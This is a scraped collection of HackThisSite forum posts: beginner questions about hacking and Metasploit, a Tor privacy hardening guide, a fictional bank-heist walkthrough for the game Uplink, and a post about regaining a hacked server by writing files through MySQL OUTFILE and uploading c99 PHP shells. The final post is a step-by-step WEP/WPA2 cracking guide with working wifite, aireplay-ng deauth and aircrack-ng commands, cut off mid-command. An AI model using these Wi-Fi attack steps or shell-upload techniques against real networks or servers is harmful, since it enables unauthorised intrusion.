sites. + the core - (hts)     this will be what makes hts independent as a site, primary development     of this repository may not be public facing for a while. the framework itself has already been rolled out as open source, you can find its github repository here:  https://github.com/hackthissite/blueelephant  . so go ahead fork it, start auditing it for security holes, inefficiencies and bugs. feel free to submit patches and pull requests for review and acceptance into the repository. the libary will be going open source as soon as possible so stay posted on updates for that -thetan

1	[Help] Web Hacking Testing	im asked by my company to test it security because it got hacked a week ago. i have no security experience whatsoever, only know a bit of networking and 2 years of web programming. anyway, my boss asked me to check the security. so it means i need to learn about it. at first, i tried to clear the basic missions first. but after a week, my boss got impatient and want me to test the website. he even threaten me to find at least one security hole in one month or he will cut my year end bonus.     i cant posted the url here because of a security reason and company policy.  heres what i have done: 1. use zap scanner to find holes but to no avail. 2. running skipfish(still running) so no results yet. what i know: 1. all user input and parameter steralized using sql prepared statement 2. use java and jsp language 3. use windows server and mysql database how it hacked the first time: someone using windows command to delete all the data. damn cracker   . what i want to ask, can you point me to the right direction to hack my company website?  any method you can think of is fine. ill do the hacking myself. ps: using backtrack right now because of its enormous of tools.
1	Connection timed out? Pulling out your hair? Read this.	"ok, so, im creating this thread in the hopes that others may be saved a lot of frustration. earlier today my connection to hts timed out. long-story short, i asked for help on the irc, got a lot of helpful people mad at me by nagging them with stupid questions (im less-than-tech-savvy), and basically gave up on ever visiting hts again. however, i did learn a lot, and am now pretty sure that the problem was caused by my retarded isp blocking hts. at first i tried hidemyass.com, but wasnt able to log in to hts due to the referer being invalid. i tried using refcontrol (ff addon) to fake the referer, but hidemyass.com doesnt allow you to hotlink their url. now, at the end of this frustration-filled day, i retold my story for the umpteenth time to yet another helpful user on the irc, knowing that it would only end with them insulting and giving up on me due to my utter cluelessness. but, lo and behold, they suggested plz.rewt.me/proxy. it worked! not only did it allow me access to hts (and removed the large, obstructive toolbar of hidemyass in favor of a much smaller, subtler one, i might add), but it lets you hotlink its address into refcontrol! so, long story short, anyone whose connection is timed out due to your isp, use plz.rewt.me/proxy and use refcontrol to change your referer to hts. also, i must thank (for their help) and apologize (for my ""special needs"") to bourbaki, fast, rijnzael, romnous, sanddbox, and anyone else attempting to help me in the irc, and give a huge thanks to bren2010 who finally suggested plz.rewt.me/proxy. ive learned a lot about...a lot of different stuff, and will probably be a little less clueless when it comes to these sorts of things in the future. thanks and sorry again to everyone in the irc, and good luck to anyone with my problem. -jake-x"
3	Optimize For Happiness	"epiphanies tend to happen at some of the most obscure times. i was having a chat with student in #modtalk on irc today and he was convinced that i wasnt fit for job as dev and then it hit me like a brick wall ""why the fuck am i writing code for hts?"". i know the value of my work, i make a great living writing code as a profession. so why write code for people who will never be pleased about anything produced by man? you can optimize and design a framework to death, but youre missing the real goal which is the product. you never want to get caught up in the system. the end product is not the system and the end user could give a rats ass about the system because all hes concerned about is the experience. so whoever is left on staff, have fun optimizing all the worthless shit you want and accomplish very little in the process. me, ill be optimizing for happiness. / resignation from hts staff"
0	Reflecting on Security	"if you havent heard of the recent zero day exploit that affected a large portion of the tor based websites, please check out this post made by limdis:  viewtopic.php?f=37&t=10422 , as well as giving limdis a big thanks for bringing this to all of our attention.  alright, so the point of this post is going to be about reflecting how keep yourself as safe as possible and to reflect on some of the issues that allowed this to be pulled off. so, the undoubtedly obvious issues we should cover are: 1. the tor browser bundle used firefox version 17, which is a bit outdated. 2. the zero day exploit took advantage of javascript. 3. possible user end errors or mistakes such as misconfiguration, leaks, or poor anonymous tactics. 4. tor is designed for anonymity, not security, so there can and will be flaws that exist inside of tor. so, im not the greatest person in networking, as many of you know, but here are some things that i thought should be kept in mind. also, if i am wrong about anything correct me, because as i said shit networking skills, and i dont want to feed off bad habits on this post. okay, so lets tackle these issues down one by one, and see if we can better ensure the quality of our anonymity. first up: the tor browser bundle used firefox version 17, which is a bit outdated. here is a screenshot i just took from the browser the tor bundle uses: using outdated software usually can lead to that software being exploited. most of the time updates are put into action to prevent exploit(s) in the said software. with that being said, avoiding updates will play a big factor on whether you are keeping your anonymity to the fullest level possible. so, whats the alternative?  well, i use linux, and i couldnt tell you anything much about how to do this on windows, mac, etc, so if someone else knows and feels like posting it, below, feel free to do that. however, what we will do on a linux based system is to install tor from its repository. in ubunu or similar based systems, you can do this with: code:  select all sudo apt-get update && sudo apt-get install tor this will install tor on your system, but thats about it. you still need a few things to do, to have this up and working correctly. the first thing you are going to want to do is to see what port tor is running on (you can change this if you like as well), and configure your browser properly to use those settings. to do this, we need to edit the configuration file, which should be located under /etc/torsocks.conf, so we run the following code: (you can use any editor other than vim, such as gedit or nano) code:  select all sudo vim /etc/torsocks.conf as you can see above, the server needs to be configured to 127.0.0.1 (localhost), and i have the tor service port assigned to listen on 9050. once that is done, save the file, and we will get started on configuring firefox correctly. with firefox, the first thing you want to do is check for updates, to see what the current version of firefox you have is, go to the help tab and then choose about firefox (help -> about firefox). check your version number with the latest stable release, and update if you need to. the next step will be to adjust the settings to allow the browser to work in compliance with the tor service. to do this, you will need to select edit, then click preferences (edit -> preferences) once edit is highlighted you can find the location from the highlighted drop down menu below: next, you will proceed to go to advanced -> network -> settings... this is demonstrated in the pictures below: locating network settings: the network settings: as you can see, located under manual proxy configuration, we have set it up to use the correct host and port in accordance to the torsocks.conf file. the next step is to actually run the tor service. to do this, we issue the following command: code:  select all sudo /etc/init.d/tor start this should give you a message, detailing the start up of the tor service. once the service is started, you should now be able to browse the web using the most updated version of firefox, in compliance with the tor services. you can check to make sure you ip is being masked correctly from numerous sites, but one of the most used sites is  http://www.whatismyip.com once this is working, we are going to want to do a couple more things to improve our security. the first, being to disable javascript, which you could do through the settings in firefox, but we can also use a nice little addon to do this for us. this will rule out number 2 on our list of security issues. anyways, the addon to use is called noscript, and i am sure many of you are familiar with it, it can be located, downloaded, and installed here:  https://addons.mozilla.org/en-us/firefo ... /noscript/ we should also make use of some other really neat addons: ghostery -  https://addons.mozilla.org/en-us/firefox/addon/ghostery adblock plus -  https://addons.mozilla.org/en-us/firefo ... block-plus betterprivacy -  https://addons.mozilla.org/en-us/firefo ... terprivacy sslguard -  https://addons.mozilla.org/en-us/firefox/addon/sslguard https finder -  https://addons.mozilla.org/en-us/firefo ... tps-finder alright, so now we should have some decent security flying about, yes? well, lets give it a go. fire up the tor service and check your ip, and also ensure that your addons are working properly. everything looking good so far? it should seem so. alright, now we will do a little test and point out one of the issues in issue number 3 -- possible user end errors or mistakes such as misconfiguration, leaks, or poor anonymous tactics. for this example you will need root access, as we will be using tcpdump and it requires root privileges to execute. first step is to grab tcpdump, if you dont already have it: code:  select all sudo apt-get update && sudo apt-get install tcpdump once it installs, we need to figure out which interface we are connecting from, to do this we can issue the command: code:  select all sudo ifconfig and scan the output until we see a valid internet address, like below looking at all the detail on the inet addr, we can see that wlan0 is our interface. once we have our interface, we can run some tests with tcpdump. lets issue the following (replace wlan0 with your interface) code:  select all sudo tcpdump -v -i wlan0 visit a site of your choice like google or facebook now. we should then see a great deal of information intercepted and displayed into your terminal, this is good, it means tcpdump is working correctly. the next thing you will want to check is what type of information can be seen on port 53 specifically, since its used for dns (domain name system), it will allow you to check and see if you have any dns leaks. to do this, we can issue the following command: code:  select all sudo tcpdump -i wlan0 -n udp and dst port 53 if you visit a site like facebook or google now, you should still be able to see some information being leaked out from port 53. this is not a good thing... so how do we prevent this? we need to edit firefox just a tad bit more, to help prevent those pesky dns leaks. to do this, open up a new tab. in the url bar, you will type in: ""about:config"". you will then receive a warranty void message, you can ignore that and proceed by clicking ""ill be careful, i promise!"". now, in the search bar at the top, you are going to want to type in: ""network.proxy.socks"", which should bring up your proxy server and port. now in the list you will see ""network.proxy.socks_remote_dns"" and it will be set to the value false. you will want to double click on this value and change it to true. this will prevent the dns leaks you seen before. now, retry the same test before: code:  select all sudo tcpdump -i wlan0 -n udp and dst port 53 you shouldnt receive any information from port 53 anymore. to trail on with security issue #3, doing things like using the same alias on hidden services as you do on the surface web, giving out credentials, etc, all falls under this category. tor is not perfect, and if the user using the tor service is an idiot, odds are it will not be very beneficial to that person. now i will tackle this one very quickly and not dive into much depth, since im not all too familiar with the concepts and ideology. 4. tor is designed for anonymity, not security, so there can and will be flaws that exist inside of tor. tor offers several layers of encryption. it received the famous onion icon as well as some other things, based on the fact that its encryption works in layers, and an onion has... layers. so if there was three hops between you and the site you need to go to, you would get secure encryption from you, and in between each hop from one node to another. so if you wanted to visit, say evilhacks.com, and need to establish three hops (lets give the hops the names a, b, c, for simplicity), it would be similar to the following: the following assumes you are sending a request to the server, when the server responds, it would work in a similar fashion except in reverse. you -> encryption -> a -> encryption -> b -> encryption -> c -> evilhacks.com the problem with this, is that someone could configure their machine to act as a tor exit node. so lets say that c is the exit node owned by ""maliciousjoe"", he will be the one left with the information, and could in theory sniff that data and try to execute some attacks on the user sending the request to evilhacks.com. this is why ssl comes in handy, and we have addons in place to attempt and prevent ssl stripping.  if you use plain text protocols to access something, it can be sniffed, and you can be exploited. this is just some stuff that i figured could be talked about. like i said, feel free to add onto this and to help educate us all on the best security measures. if i am wrong on anything in here, please correct it and possibly give links to places to look over the facts. educate everyone..."
1	Locking a folder	i am trying to create a password protected folder to hide all the info related to hacking and stuff. i want it to be visible but requires password whenever one tries to move, copy, open or delete it. searched google for help. found  this article . but this renames and hides it as a system folder. i even tried folder lock but it also does the same. is there way to accomplish the task?
2	Server hacked	one of my dedicated servers windows 2003 got hacked by russian spammers installing ams mail software. the hosting provider is slow to respond been over 24 hours thats the trouble with small companies. so been trying to see if i can get it back. site is running php/mysql/iis.  php has curl, zip, gd, imap,mycrpt support there were two admin accounts but the password on them all has been changed and so has most of the other local accounts. able to write to any file using mysql outfile so usedthat to write files and execute php code.  i can do basic limited account commands such as net user  but cant change the password using net user administrator newpassword limited account that i have access is the default i_user account for iis was able to upload some of the php shells such as c99 which was great for file browsing but not much more than that. checked opened ports to see if the malware added a backdoor or anything i could jump into didnt see anything except alot of email being sent out to taiwan and ips pointed to russia. right now i am leaning on using mysql outfile some how to restore access not sure what to write to. i believe mysql is under a system level account so should be able to write to any file. i wrote to startup folder a batch file to change the password for the accounts if they retry to login.  basically want to see if there is a file i can write to that would be executed if i reboot the server or any other idea.
2	I dont understand, am I being hacked or something?	"i am honestly super lost at this point. so i just set up a new router, and everytime i do ipconfig in cmd prompt i get this: now i am not sure why its doing this. it still gives me my ip and stuff, but with this big mess of ""media disconnected"". did i do something wrong or is it just something with the router. either way i am not sure. with this one i do not understand really whats going on. i had limewire open and when i typed netstat -n it showed me all that. when i closed the program, it immediately went down to the cmd prompt on the right. is this okay or what am i missing? this last one i was just not sure of. i just went into the router, to set up my wep, and changed the admin password. then i checked the logs for giggles and i get ""dos attack"". which apparently wasnt that strong, and my friend told me most dos attacks are blocked by isps. which i dont understand since i have literally had my router up for 3 hours at the most. then the part about ""[lan access from remote]"" part. was someone trying to access my router or what? then there are some random ports. i am honestly not sure of all this and would greatly appreciate your knowledge on the situations. much thanks,  h4ku."
1	How to install METASPLOIT on windows?	i don´t know where to post this so i posted it here. i am a noob after all.   i use vista and i have downloaded the metasploit framework  for vista. but when i try to install it, it keeps giving me this error! it asks me to verify database number? the default setting is 7157 or something like that -_- it wont accept any number. is this a port number to my own damn machine or something else? (it doesn´t show up in the firewall as far as i have seen, but that´s probally because i haven`t installed it!) i tried metsaploits own bug list, but the webpage is dangerous, containing an server exploit according to my anti virus program.  i have had this problem for more then a week and i have no idea what to do about it xd this is so silly but i have to ask here! i have nowhere else to go ;( please help me
1	Metasploit + backtrack newb questions	ive been on hackthissite for a while now trying to complete the challenges as well as reading random forum topics.  anyway, i have hacking the art of exploitation which talks a lot about computer memory (stacks, little edian, overflows, ect) and i recently watched a video where a fresh install of windows 7 was exploited using autopwn from metasploit very easily.  i feel like this is much more script kiddy as you dont really know whats going on behind the scenes to get this exploit and take over working.  so im just wondering if anyone here has used backtrack/metasploit and if these tools are too automated for a beginner to learn from, and if they arent, in what ways did you learn from it/what did you learn/how you improved on your knowledge from these products ect. thanks. edit: well im probably not gonna get any replies here but it was worth trying.  for anyone else that came across this looking for answers, i suggest googling each of the individual tools provided with backtrack to get more information on them.  thats what ive turned to for learning these tools and so far, im learning.
1	What should my focus be?	ohai. i wunner bee 31337 kthx? no, really, im turned on by exploits - they make me tinglish. im perfectly capable of exploiting known ones with metasploit - but in fear of remaining a script kiddie for the rest of my days - and because these things makes me wonder a whole lot, i wanna be the one to expose them, rather than just take advantage of them. of course, im looking for an easy how-to-be-elite guide, preferably in one page that... alright sorry.  what i do know: im pretty down with sql. wee. i know a bit o everything, but nothing much about a single trait - i can program the very basics of a range of different languages, some asm for intel, c++, enough php to get a cms up and running, some python (all ive done in that is a simple rsa encrypter/decrypter. and a fair understanding of tcp/ip. now, im not asking for a guide on how to find vulnerabilities, as i realise that makes no sense, im merely wondering where to focus first. should i concentrate on understanding asm and debuggers, c++, should i learn a language first, where do i go? i guess my problem is i find it all way too interesting, and have difficulties sorting out - i desperately want to understand how my mbr works, wtf a kernel is made of, and how those seemingly magical rainbowtables work - so if i told you i want to be the guy who discovers the next vulnerability in iss, sql, dns, (or something less ambitious, but you get my drift), whered you direct me first?  tl;dr: where do i put my focus if i wanna learn to discover vulnerabilities? language, protocols, debuggers, whatdoido? thanks in advance. rng8

3	"What makes these systems ""unhackable""?"	"before i proceed to the point, i would like to explicitly clarify that i am not asking anyone regarding how to ""hack"" hotmail, yahoo, facebook, etc. the answers i expect should have nothing related to such and are for educational purposes only. i do not condone any illegal activity whatsoever. i have tried searching for answers on google, but the only things i come up with are ""133t h4x0r5"" who have hacked hotmail/yahoo/facebook with their photoshopped screen shots as ""proof"". i would like real answers from real experienced security experts (i prefer not to use the term hacker as it has been watered down by these idiots and script kiddies). without further due, here is the paragraph for discussion: to the best of my knowledge, it is unrealistic and near impossible to access secured data and accounts through ""hacking"" hotmail, yahoo, facebook and various other services. how are these systems differentiated from ordinary web sites?  a common answer might be ssl as it might take decades to crack. if so, how do people enter secured systems like that of the pentagons and cias? im sure they secure their systems far harder than enterprises.  another common answer is the ""lazy system admin"" who tends to forget to close ports at times. i dont think the attacks on american national security agencies and the ""lazy system admin"" problem occurring at the same time were mere coincidences. to the best of my knowledge, the attacks were carried out remotely. is there such a thing as ""unhackable""? if so, why does not everyone use such a system? if not, why isnt there chaos in this world related to exploiting online banking or cyber warfare? this is not a q/a session. it is more of a discussion. please give me your thoughts and opinions on the subject. even though whatever i have posted is accurate to the best of my knowledge, it is natural to make mistakes, and if i have made any on my post, please point it out and i will correct it. (please exclude social engineering and internal access as i believe those are not related to the technical side of it security)  (hacking is a very general term. in this context i mean it as unauthorized access of data on secured servers)"
3	Freindly Prank	thanks for taking the time the to read this. i had an idea to hack my friends weebly, however i cannot find where to start. i have read a plethora of articles saying how weak weeblys security is, but nothing seems to point me in the direction i need to go. he is an admin and i wish to play a small prank on him. if anyone has a suggestion on a place to start or an idea of want to do, i would really appreciate it. thanks again for your time, and i cant wait to hear back.
1	Someone was remotely controlling my computer	i was sitting in my living room and suddenly my computer screen started navigating to different websites, someone was going between my email and the paypal website trying to reset the paypal account linked to that email. there is no paypal account linked to that email, so they were unsuccessful. i have a windows 7 computer. after i noticed them doing this i shutdown my network, enabled a password lock on my user account to activate every five minutes, and enabled mac address filtering on my router.    my question is how would they have most likely done this so, i can protect my self from this in the future? also do you think this attack came from someone who was able to access my network through my  wifi router or would this be someone who was not in close proximity to my house. as of right now i do not have the microsoft remote desktop client running on my computer, but i do have a teamviewer account linked on this desktop. i have since changed the passwords to my email and teamviewer account.  thanks for any help in advance.
3	irc discussion	"so, i havent been around hts for sometime now... many many years... but upon coming back, all im hearing from the irc are users complaining about this recode... i obviously have no opinion because i havent been around long enough to. but from reading forum posts and listening to irc (while keeping in mind that people tell one-sided stories while angry) im seeing that all of htss attention is being spent on recoding hts from the ground up? i think this may be a bit of a waste of time, as there are plenty of already built solutions that are out there, and could save time for (what i consider to be the most important priority of hts) the challenges. i think 99% of all users that come to hts came here in search of ""hacking challenges"", i know i did. the whole rootthisbox idea is fun and all... but i also think its kind of missing the point of what hts is. hackthissite has always been a first stepping stone for noobs. i first came to hullaballoo not knowing a single thing about html. its sad seeing hts trying to make itself into something its not.  also, i wish there was a bigger outreach to the users to help hts. not just a ""apply here"". im imagining a simple page with a textbox and submit button letting people submit links to their own challenges (application, website, or even just txt doc about a challenge idea) users could then ""like"" a challenge, and once in a while hts staff could take a challenge, audit its code (or just re-implement if they want) and add a new challenge i know personally, the first thing i did after finishing hackthissite was writing my own missions (albeit very simple ones). i think i was the first person besides jeremy to write missions for hts. and honestly, how cool would it be to a user to have their own mission on hts. serious cred  there were some other good ideas in irc when i brought this up a couple of times: small paragraph after each mission explaining what they just did (in case they just found the answer online or something) and how it could be used in other ways less linear missions with multiple vectors more up-to-date attack vectors hg said he put together a series of ""interactive tutorial"" missions... which i think would make a great contribution to the website... as of now we just assume the user figures it out on their own, or goes to the forums... but im sure alot just give up and never try again but anyway, after all of that. id like to propose a nice well-tempered irc discussion if possible with kage/whoever else is part of hts admin/decision making to hear some of these ideas out, and prioritize with them. thoughts?"

1. go to the public access server of the target bank, put the telephone     no. of the administrator in your links. 2. call him, use voice analyser. 3. go to the target bank, bualc. 4. go to admin, monitor bypass. 5. break password, use voice and decypher the code. 6. put in a mail every accountnr. and password, send it. 7. delete logs at internic. 8. return to the bank, not bualc. 9. use every account, check their balance. 200000 or above will be enough. 10.mail the accountnr. and password again. if there arent any high     accounts, thats too bad. 11.one note here though, you should check their statements too. when they    transfered a high amount, use that account and ip given.                         =-=-=-=-=-=-=-=-=-=-=-=-=-= 4.2                       create your own account                         =-=-=-=-=-=-=-=-=-=-=-=-=-= go to the target bank, create your own. this makes the process a lot easier. now the last mail: - accountnr. - bank ip - amount (either use all, or the amount stated in the ""transfer mission""    to make it easier) ------------------------------------ used the banks admin, also put:  ------------------------------------ - target accountnr. - target password.                         =-=-=-=-=-=-=-=-=-=-=-=-=-= 4.3                     save user/create connection                         =-=-=-=-=-=-=-=-=-=-=-=-=-= backup your save: - outside the game, go to user, your name. - copy all 3 files to another directory, your name, options and debug file. - restart game. create bualc connection to the target bank, save it. _______________________________________________________________________________ _______________________________________________________________________________                         -----------=-=-=----------- 5.0                           transfer money                         -----------=-=-=----------- now for the real job. chances that youre getting caught are high even if  youre fast. to prepare enough, read every step before doing the transfer.  this can be done one by one: - load the connection. - go to the target account. - go to ""transfer"" - put in all thats needed (target bank ip, your accountnr and amount). - bypass proxy and monitor. - open the log deleter at most speed.                         =-=-=-=-=-=-=-=-=-=-=-=-=-= 5.1                    internal and external tracing                         =-=-=-=-=-=-=-=-=-=-=-=-=-= you might want to ask yourself, why do i have to be so fast? well thats like this: - because of the monitor bypass, you dont have an internal trace. this   is the one with the trace tracker. - however, once you transfer, an external trace will be started towards   your account. the game will go from system to system inside your long   connection, from log to log, until they find your account. the feds are   send, and youre down. thats the whole point behind it.                         =-=-=-=-=-=-=-=-=-=-=-=-=-= 5.2                     transfer + delete statements                                + delete logs                         =-=-=-=-=-=-=-=-=-=-=-=-=-= youll be caught within a minute! does this mean youve a minute? no,  youve around 20 - 30 seconds to delete the statements and logs, because the game found you within a minute, but the feds need to arrive  . the exact hacking: - transfer the money, press ok. if it failed will be clear once you want to   delete your statement, you havent any yet. - go to the statements, delete the most upper statement. - go to your account, delete the statement. - go to internic, use password, open log deleter, delete the routed log. - disconnect. now use the ""per minute time"", the second in the menu above in your screen.                         =-=-=-=-=-=-=-=-=-=-=-=-=-= 5.3                        getting caught or not                         =-=-=-=-=-=-=-=-=-=-=-=-=-= this is a simple notification. if your screen goes black, you failed. youll be notified that youre account has been seized and you cant continue. copy your save. but, if you receive message, this will be from uplink, you raised about 6 uplink levels! congratulations, you hacked without fail. what is most important for your caught: the statements. that gets us to the next and last point.                         =-=-=-=-=-=-=-=-=-=-=-=-=-= 5.4                    hacking complete bank at once                         =-=-=-=-=-=-=-=-=-=-=-=-=-= huh??? that isnt possible! yes, it is. for this you can best use the banks admin trick. get all accounts from a bank (mail them, password and account),  create one of your own and connect bualc to the bank and bypass systems.  now: - connect to first account. - look how much money, go to transfer and fill it all in. - transfer, delete both statements. - connect to second account.... - so on.... - transfer and delete statements from last account. - go to internic and delete the single routed log. if not yet, this will get you to either techno-mage or terminal. _______________________________________________________________________________ _______________________________________________________________________________                         -----------=-=-=----------- 6.0                                faqs                         -----------=-=-=----------- q: im getting caught every time. a: the most known faq about this. youre just not fast enough, or doing a step     wrong. both happen frequently, that is. by reading 5.3 and 5.4 you can see    that the most dangerous ""logs"" are the statements. transfer, go immediatly    to statements and delete, do so at your account and if youre only hacking    one account, delete routed log at internic. q: why should i use internic? i always use the uplink test machine. a: three reasons for and one against it:    - internic doesnt need the ""admin"" to be writtten in the      admin section.    - the password is always the same with your user. but, when logged in on       another user it will be different.     - youre not traced internal and external, so you can make a direct       connection.    if you really want to use the test machine, this is why:    - no matter what user, the password is always ""rosebud"" q: what should i do with the money? a: buy yourself all equipment (best gateway etc.) and bying all software     (except for the disablers, you already have bypass). q: my game has no accounts with much money, i checked every bank. what shoud    i do? a: too bad then, you cant do anything about it. you can still use the hacking     trick to gain experience, but no money. not much that is. q: when im hacking all accounts on a bank, i just caught in the middle of     transferring. how is it possible? a: this means you deleted one of your previous statements too late. no matter    what you did (deleted routed log, etc.), you would always be caught. q: i hacked all accounts by using the ""hacking complete bank at once"" trick.    will they return with money on it? a: i cannot verify this completely. after going fast forward for at least a    month, only the uplink fees where payed. most accounts i hacked gave -300,    lol.     one another obvious thing, all of the transfers occurred, before you started    your game. i dont think they return, maybe for the ""transfer mission"", but    i doubt it. q: can i use disable instead of bypass? a: of course its possible. but, the chances are even more lower if you do that.    chances of succeeding will be too low. this because of two things:    - youll be traced inside the bank before transfering.    _ the external trace will begin faster. q: isnt this cheating? a: not to me. its a in-game based trick, which can be used to complete the game    easier. if you dont want to use it and play the storyline without it, thats    up to you. but then you shouldnt be reading this guide. q: after a fail, how do i restore a save? a: copy the three files back to the users file and overwrite. q: did you fail many times? a: yeah, and i still do. it just calls speed and good reflexes. chances of     failing are the best they should be. high, but its possible to succeed a     hacking attempt. _______________________________________________________________________________ _______________________________________________________________________________                         -----------=-=-=----------- 7.0     credits - i thank mc@kay, bowaters and my black hat brotheres@mit           for creating the game.                         -----------=-=-=----------- if there are any questions or interested in purchasing all the hacking software  please contact me via the below email or pm me here. email:  jayvaleno09@gmail.com"
1	In the process of making my own Operating System.	"why hello there mr. hts, i was wondering if you had any ideas for me. im currently in the process of making my own personal operating system, and as any osdev would want, i want it to be different from the others.  currently my only ideas are portability, and modes, both of which ill explain in detail below.  anywho, i have a simple simple kernel done, the bootloader done (though i think i might just use grub), and the linker done.  so far all it says is ""well hey there"" then it hangs there for the remainder, until you shut it off.  anywho, i was wondering if you fine people had any ideas of what i should add, besides what im planning to add.  also, if you could tell me if im completely crazy in my ideas, that would be wonderful.  thanks ~c modes- different modes that would be tasked with different things.  it could be that when youre in a certain mode, you can only do certain things.  for instance, when im in ""user mode"" i shouldnt be able to issue a ""server start"" command, nor should i be able to issue a ""ping"" command.  each of these following commands should only be able to be started in that certain mode.  the current modes i have in mind are: user - for your general file manipulations, applications, and maybe a few more things root - for editing system files networking - for things like ""ping"", ""tracert"" , and the like server - can be set to ""nm"" which is ""no monitor"" but essentially turns the computer into a server, which can be broken after a simple key combo (cntrl + c ?"") developer - access to developing tools, such as making anything from ""c"" programs, to python scripts, to asm programs portability - when youre in root mode, and had a flash drive greater than 16 gigs inserted into your machine, you would be allowed to issue the command ""drive [drive letter] copy -os -a"".  this would copy your entire os onto that flash drive.  it would also change a few config files/boot loader files/kernel files so that it could be run from that flash drive.  that way you could take your os (or at least a copy of it) wherever you went.  i was also thinking that if you had your normal computer running in server mode, you could sync up all the changed files to the server, so that all your files would be updated on your main computer. this would be my summer project, and am hoping that i would get to the point where i can switch modes by the end of said summer.  i know that i will not complete this entire thing for at least 2 years, but hey, i got nothing better to do.  so, tell me what you think! if youd like to be involved in this, just pm me, if not and you want to flame me for under-taking such a daunting task, flame away, and if youd like to be nice and tell me some ideas you think would be cool, well... thatd be cool.  ill provide info on this thing below. coding in- fasm/free basic  for- 32 bit cpus getting my info- osdev.org if you want the code, just pm me, its nothing special or new... fow now"
1	New to the scene with questions...	"im very interested in learning the ins and outs of network hacking, being able to compromise systems and pull information off of them.  my goal is to enter the info sec field eventually.  ill briefly list my knowledge base.  nothing past high school in terms of ""traditional"" schooling.  i have my a+ and network+, studying for my ccna / security+.  i know the routing protocols / osi / etc. like the back of my hand (as anyone going the ccna route damn well should   ) .  pretty fluent in html (enough to pass most of the basic missions).  not so handy with javascript. ive been teaching myself linux over the past couple months so im fairly well exposed to cli and how to work in it.  most of my exposure has been to windows (trying to break this habit by learning linux, not being able to run dual monitors properly with the current ubuntu is keeping me tied to dual booting), so im pretty well versed in windows.  ive studied a bit for ms 70-680 and 70-685 exams, so im pretty well rounded in windows 7. anyway,  i do everything the self taught way.  so my questions, if youd be so kind as to reply... 1) this may sound naive, or even stupid, but is learning to program required?  ive assumed it is, but ive never really had anywhere to confirm this.  i know that ill end up learning java script and php, then moving on to perl if i need to learn it.  (im not ""opposed"" to it, ive just never been exposed to it much"". 2) ive looked through various threads and it seems the suggested path is as follows - html < java < php < perl - correct? 3) to keep myself anonymous on the net i use various addons for firefox, and run in private mode.  ive been looking into i2p and tor, but they seem rather clunky.  is paying for a solid vpn worthwhile to maintain privacy? i may have more questions depending on the responses i receive.  any information that could be provided would be greatly appreciated!"
0	How to Break into WEP and WPA2 Secured Access Points	"written by g3n3t1c5 over the course of the past several months i have spent a good bit of time diving into this subject and thought i would share it with the community.  this is meant to be simple and comprehensive, giving a basic understanding on the vulnerabilities with each of these security protocols and a how-to guide on attacking each of them. what you will need vmware or virtualbox kali linux vm external wifi dongle (i use a tp-link tl-wn722n) breaking into a wep secured access point wired equivalent privacy (wep) is an outdated security algorithm and is superseded by wireless protected access (wpa/wpa2).  it is important to understand why it is flawed and if you know anyone who is still using wep please let them know how easy it is to penetrate.  over the past year i had taken a wireless networking course in which one of the classes, the instructor setup a wep secured router and we were to break into it.  using a simple tool supplied in the kali linux suite called wifite; i was able to get the key in 36 seconds.  hopefully this gives you an understanding on how insecure wep is. without going into extreme details, the principle behind finding the passphrase is capturing initialization vectors (iv’s) also called starting variables (sv’s).  wep uses a stream cipher called rc4 (arcfour) and cannot have the same traffic key used twice.  iv’s are used to prevent repetition in the key stream. but when a network is busy with traffic there is a high probability an iv will eventually repeat. we are going to use wifite for breaking wep open up a command prompt in kali and type. wifite –wep the program should begin and put your wi-fi adapter in monitor mode, and because we added the –wep into the command it will begin listening for only wep secured networks.  if you have a router to test this out with, wait until it displays the ssid you chose. when wifite has found it, press ctrl+c and type in the number that your ssid appeared on the list then press enter. wifite should begin its attack on the network. as you can see from the picture above at around 10,000 iv’s it will start cracking the passphrase and will display it for you once it is done.   one thing about wifite that i haven’t had too much luck with, but hopefully those of you who use this guide will, is that it performs various attacks to help obtain the key quicker, such as an arp replay attack.  if there is no traffic within the network it will take forever gathering over 10,000 iv’s.  basically an arp replay attack will generate traffic so that you do not have to wait for a client on the network to do it. breaking into a wpa2 secured access point   wpa2 (wireless point access 2) is what is used to secure most access points today.  this typically takes much longer breaking into than a wep secured network. instead of capturing iv’s, we need to capture a wpa handshake which is when a client connects to an access point.  in this 4 way handshake is the hash encryption of the plaintext password for the network, fortunately for us and yet unfortunately for us, the purpose of a hash is to prevent a hacker from ever finding out the plaintext password. so once we have captured the handshake, we will run a rainbow table against the hash.  kali linux already has a rainbow table in it called rockyou.txt which has around 14,000,000 passwords in it. if you end up wanting to get a larger rainbow table there are some more available on the internet, the largest i have found is 1.43 billion passwords. there will be 5 steps in us breaking into a wpa2 secured access point. 1.	find out the bssid (basic service set id) or mac (media access control) address of the access point 2.	begin to monitor traffic from the clients to the access point. 3.	 launch a deauth attack (de-authentication) against a client within the network. 4.	capture the handshake from the client we have de-authenticated from the network when it re-connects. 5.	running aircrack using our rockyou.txt rainbow table to obtain the password. we need to first find out what is the interface for our wi-fi dongle. step 1:[/b ] in a command terminal type iwconfig and your adapter should display, typically as wlan0 for the interface. after that we need to put it in monitor mode. root@kali:~# airmon-ng start mon0 it should display different wifi networks that are around you and clients your adapter can see that are connected to them. you will need the bssid and the ch (channel) for the next part. [b] step 2: after we have found this information out about the network we will now narrow our view to just that access point and its clients, as well as write a file when the wpa handshake is found. root@kali:~# airodump-ng –c (your channel) --bssid (mac address of the access point) –w (whatyouwanttocallthefile) mon0  (the monitor interface we set earlier) here is an example  root@kali:~# airodump-ng –c 1 --bssid  00:ff:1c:a2:90:1d –w pentest mon0 you should see something like this this needs to stay running until a handshake is captured.  we can either leave it on and wait for a client to join the network or we can force a client to rejoin using a deauth attack. step 3 and step 4: this step will be short and sweet, you will need both the mac address of the access point and the client. to launch the attack, open up another terminal, do not close the one monitoring traffic.  in the new command prompt type  aireplay-ng -0 25 -a (mac of access point) -c(mac of client) mon0 (interface) example aireplay-ng -0 25 -a 00:ff:1c:a2:90:1d -c 99:c4:ff:5f:8a:b8 mon0 this will cause the client to disconnect from the network and when the attack stops the client will rejoin and you will capture a wpa handshake.  the number “25” in the line is how many times aireplay will send deauths to the client.  if a few minutes go by and you still haven’t captured a handshake you may want to send another attack and increase the number. step 5: once it shows that you have captured a wpa handshake (if you did it will display next to the time and date, circled green in my screenshot) press ctrl+c to stop airodump and we are now going to run aircrack with our rainbow table against the handshake, if the password is in our database, it will compare the 2 hashes together and if it’s a match it will display the password for you. i chose a password that i knew was in the rockyou.txt table. at a rate of 600 keys a second it should take you around 8 hours to go through the entire file. command is  aircrack-ng -w rockyou.txt (what you chose for the name of the capture file)-01.cap example: aircrack-ng -w 